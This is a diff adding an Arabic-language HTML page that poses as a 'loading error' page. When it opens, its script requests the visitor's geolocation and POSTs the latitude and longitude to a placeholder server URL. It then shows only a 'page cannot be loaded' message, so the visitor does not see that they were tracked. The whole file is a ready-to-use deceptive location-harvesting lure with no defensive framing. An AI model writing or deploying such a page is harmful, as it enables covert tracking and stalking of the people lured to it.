@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>خطأ في التحميل</title>
+</head>
+<body>
+  <h1> </h1>
+
+  <script>
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const data = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude
+        };
+
+        fetch("https://YOUR_SERVER_URL/receive_location", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(data)
+        })
+        .then(response => response.json())
+        .then(result => {
+          document.body.innerHTML += "<p>لا يمكن تحميل الصفحة </p>";
+        })
+        .catch(error => {
+          document.body.innerHTML += "<p>لا يمكن تحميل </p>";
+        });
+      });
+    } else {
+      document.body.innerHTML += "<p>لا يمكن تحميل الصفحة.</p>";
+    }
+  </script>
+</body>
+</html>
